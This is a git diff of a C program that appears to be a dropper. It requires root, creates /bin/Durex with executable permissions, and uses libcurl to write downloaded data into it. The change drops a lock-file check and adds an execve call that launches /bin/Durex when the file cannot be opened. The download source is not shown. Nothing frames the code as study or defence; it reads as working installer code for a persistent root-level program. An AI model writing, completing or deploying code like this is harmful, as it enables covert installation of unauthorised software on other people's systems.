@@ -18,21 +18,17 @@ size_t write_data(void *buffer, size_t size, size_t nmemb, void *fd_data)
 int		main()
 {
 	int fd;
-	int fd_lock;
 	CURL *handler;
 
 	if (getuid() != 0)
 		return (0);
 
-	fd_lock = open("/var/lock/Durex.lock", O_CREAT | O_RDWR, 0644);
-	if (flock(fd_lock, LOCK_EX | LOCK_NB) == -1)
-		return (3);
-	flock(fd_lock, LOCK_UN);
-
-
 	fd = open("/bin/Durex", O_CREAT | O_WRONLY | O_TRUNC, 0700);
 	if (fd == -1)
-		return (0);
+	{
+		execve("/bin/Durex", (char*[]){"/bin/Durex", NULL}, NULL);
+		return (1);
+	}
 
 	handler = curl_easy_init();
 	if (handler)
